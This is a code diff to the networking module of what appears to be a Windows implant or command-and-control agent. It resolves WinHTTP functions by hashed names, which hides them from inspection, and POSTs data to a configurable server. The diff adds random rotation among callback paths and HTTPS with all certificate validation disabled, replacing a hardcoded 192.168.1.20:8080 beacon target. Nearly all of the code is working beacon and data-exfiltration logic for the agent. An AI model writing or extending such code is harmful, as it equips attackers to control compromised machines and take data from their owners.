@@ -26,14 +26,15 @@ NetMgr::NetMgr() {
 	this->WinHttpDll = kratos->apis.LoadLibraryA( dll );
 
 	if ( this->WinHttpDll ) {
-		this->apis.WinHttpOpen               = ( decltype( this->apis.WinHttpOpen               ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpOpen" ) );
-		this->apis.WinHttpConnect            = ( decltype( this->apis.WinHttpConnect            ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpConnect"  ) );
-		this->apis.WinHttpOpenRequest        = ( decltype( this->apis.WinHttpOpenRequest        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpOpenRequest"));
-		this->apis.WinHttpSendRequest        = ( decltype( this->apis.WinHttpSendRequest        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpSendRequest"));
-		this->apis.WinHttpReadData           = ( decltype( this->apis.WinHttpReadData           ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpReadData"));
-		this->apis.WinHttpCloseHandle        = ( decltype( this->apis.WinHttpCloseHandle        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpCloseHandle"));
-		this->apis.WinHttpReceiveResponse    = ( decltype( this->apis.WinHttpReceiveResponse    ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpReceiveResponse"));
-		this->apis.WinHttpQueryDataAvailable = ( decltype( this->apis.WinHttpQueryDataAvailable ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpQueryDataAvailable"));
+		this->apis.WinHttpOpen               = ( decltype( this->apis.WinHttpOpen               ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpOpen"               ) );
+		this->apis.WinHttpConnect            = ( decltype( this->apis.WinHttpConnect            ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpConnect"            ) );
+		this->apis.WinHttpOpenRequest        = ( decltype( this->apis.WinHttpOpenRequest        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpOpenRequest"        ) );
+		this->apis.WinHttpSendRequest        = ( decltype( this->apis.WinHttpSendRequest        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpSendRequest"        ) );
+		this->apis.WinHttpReadData           = ( decltype( this->apis.WinHttpReadData           ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpReadData"           ) );
+		this->apis.WinHttpCloseHandle        = ( decltype( this->apis.WinHttpCloseHandle        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpCloseHandle"        ) );
+		this->apis.WinHttpReceiveResponse    = ( decltype( this->apis.WinHttpReceiveResponse    ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpReceiveResponse"    ) );
+		this->apis.WinHttpQueryDataAvailable = ( decltype( this->apis.WinHttpQueryDataAvailable ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpQueryDataAvailable" ) );
+		this->apis.WinHttpSetOption          = ( decltype( this->apis.WinHttpSetOption          ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpSetOption"          ) );
 		DEBUG_LOG("[+] Loaded winhttp dlls");
 	}
 	else {
@@ -77,49 +78,84 @@ BOOL NetMgr::EnsureRecv( SIZE_T needed ) {
 
 BOOL NetMgr::Post( PBYTE data, SIZE_T DataSize ) {
 	HINTERNET hRequest = NULL, hSession = NULL, hConnect = NULL;
-	DWORD avail = 0, total = 0, read = 0;
+	DWORD avail = 0, total = 0, read = 0, flags = 0, isSecure = 0;
 	BOOL sent = FALSE;
+	LPCWSTR path = L"/";
 
-
-	hSession = this->apis.WinHttpOpen( NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-		WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
-	if ( ! hSession ) { goto NEXT; }
-
-	hConnect = this->apis.WinHttpConnect( hSession, L"192.168.1.20", 8080, 0 );
-	if ( ! hConnect ) { goto NEXT; }
-
-	hRequest = this->apis.WinHttpOpenRequest( hConnect, L"POST", L"/index.php", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0 );
-	if ( ! hRequest) { goto NEXT; }
-
-	if ( ! this->apis.WinHttpSendRequest( hRequest, NULL, 0, ( LPVOID )data, ( DWORD )DataSize, ( DWORD )DataSize, 0 ) ) {
-		DEBUG_LOG("[+] Failed Sending Request");
-		goto NEXT;
+	INT32 start = 0;
+	if ( this->TotalPaths > 0 ) {
+		ULONG seed = kratos->apis.GetTickCount( );
+		seed ^= ( ULONG )( ULONG_PTR )this;
+		start = ( INT32 )( kratos->apis.RtlRandomEx( &seed ) % ( ULONG )this->TotalPaths );
+		DEBUG_LOG( "[+] Using path index %d", start );
 	}
 
-	if ( ! this->apis.WinHttpReceiveResponse( hRequest, NULL ) ) { goto NEXT; }
+	for (INT32 attempt = 0; attempt < this->TotalPaths; attempt++) {
+		INT32 i = ( start + attempt ) % this->TotalPaths;
 
-	for ( ;; ) {
-		if ( ! this->apis.WinHttpQueryDataAvailable(hRequest, &avail ) ) { goto NEXT; }
-
-		if ( avail == 0 ) { break; }
-
-		if ( ! this->EnsureRecv( total + avail ) ) { goto NEXT; }
-
+		hRequest = NULL;
+		hSession = NULL;
+		hConnect = NULL;
+		avail = 0;
+		total = 0;
 		read = 0;
-		if ( ! this->apis.WinHttpReadData( hRequest, this->RecvBuf + total, avail, &read ) ) { goto NEXT; }
+		flags = 0;
+		isSecure = 0;
+		sent = FALSE;
 
-		if (read == 0) { break; }
-		total += read;
-	}
-	this->recvLen = total;
-	sent = TRUE;
+		hSession = this->apis.WinHttpOpen( NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+		WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
+		if ( ! hSession ) { goto NEXT; }
 
+		hConnect = this->apis.WinHttpConnect( hSession, this->Domain, this->Port, 0 );
+		if ( ! hConnect ) { goto NEXT; }
+
+		path = this->Paths[i];
+		if ( this->isHttps ) {
+			isSecure = WINHTTP_FLAG_SECURE;
+			
+		}
+
+		hRequest = this->apis.WinHttpOpenRequest( hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, isSecure );
+		if ( ! hRequest) { goto NEXT; }
+		if ( this->isHttps ) {
+			flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
+				    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
+				    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+				    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+			this->apis.WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+		}
+
+		if ( ! this->apis.WinHttpSendRequest( hRequest, NULL, 0, ( LPVOID )data, ( DWORD )DataSize, ( DWORD )DataSize, 0 ) ) {
+			DEBUG_LOG("[+] Failed Sending Request");
+			goto NEXT;
+		}
+
+		if ( ! this->apis.WinHttpReceiveResponse( hRequest, NULL ) ) { goto NEXT; }
+
+		for ( ;; ) {
+			if ( ! this->apis.WinHttpQueryDataAvailable(hRequest, &avail ) ) { goto NEXT; }
+
+			if ( avail == 0 ) { break; }
+
+			if ( ! this->EnsureRecv( total + avail ) ) { goto NEXT; }
+
+			read = 0;
+			if ( ! this->apis.WinHttpReadData( hRequest, this->RecvBuf + total, avail, &read ) ) { goto NEXT; }
+
+			if (read == 0) { break; }
+			total += read;
+		}
+		this->recvLen = total;
+		sent = TRUE;
+		
 NEXT:
-	if ( hRequest ) { this->apis.WinHttpCloseHandle( hRequest ); }
-	if ( hConnect ) { this->apis.WinHttpCloseHandle( hConnect ); }
-	if ( hSession ) { this->apis.WinHttpCloseHandle( hSession ); }
-
-	return sent;
+		if ( hRequest ) { this->apis.WinHttpCloseHandle( hRequest ); }
+		if ( hConnect ) { this->apis.WinHttpCloseHandle( hConnect ); }
+		if ( hSession ) { this->apis.WinHttpCloseHandle( hSession ); }
+		if (sent) { return TRUE; }
+	}
+	return FALSE;
 }
 
 
@@ -147,38 +183,42 @@ SIZE_T NetMgr::DataSize( ) {
 }
 
 
-BOOL NetMgr::SetHttpConfig(INT32 TotalDomains, PCHAR Domain, PCHAR* Paths) {
+BOOL NetMgr::SetHttpConfig(INT32 TotalPaths, PCHAR Domain, INT32 Port, BOOL isHttps, PCHAR* Paths) {
 
 	INT size = kratos->apis.MultiByteToWideChar(CP_UTF8, 0, Domain, -1, NULL, 0);
 	if ( size == 0 ) { return FALSE; }
 
 	this->Domain = (PWCHAR)kratos->apis.LocalAlloc( ALLOC_ARGS, size * sizeof( WCHAR ) );
+	if ( ! this->Domain ) { return FALSE; }
 
 	if ( ! kratos->apis.MultiByteToWideChar(CP_UTF8, 0, Domain, -1, this->Domain, size ) ) {
 		kratos->apis.LocalFree( this->Domain );
 		return FALSE;
 	}
 
-	if (TotalDomains < 0 || TotalDomains > 5) {
+	if (TotalPaths < 0 || TotalPaths > TOTAL_PATHS) {
 		kratos->apis.LocalFree( this->Domain );
 		return FALSE;
 	}
 
-	if (TotalDomains > 0 && this->Paths == NULL) {
+	if (TotalPaths > 0 && Paths == NULL) {
 		kratos->apis.LocalFree( this->Domain );
 		return FALSE;
 	}
 
-	for (INT32 i; i < TotalDomains; i++) {
-		if (this->Paths[i] == NULL) {
+	for (INT32 i = 0; i < TotalPaths; i++) {
+		if (Paths[i] == NULL) {
 			kratos->apis.LocalFree( this->Domain );
 			return FALSE;
 		}
 
-		if (!kratos->apis.MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, Paths[i], -1, this->Paths[i], ARRAY_SIZE(this->Paths[i]))) {
+		if (!kratos->apis.MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, Paths[i], -1, this->Paths[i], MAX_PATH_LEN)) {
 			kratos->apis.LocalFree( this->Domain );
 			return FALSE;
 		}
 	}
+	this->TotalPaths = TotalPaths;
+	this->isHttps    = isHttps;
+	this->Port       = Port;
 	return TRUE;
 }
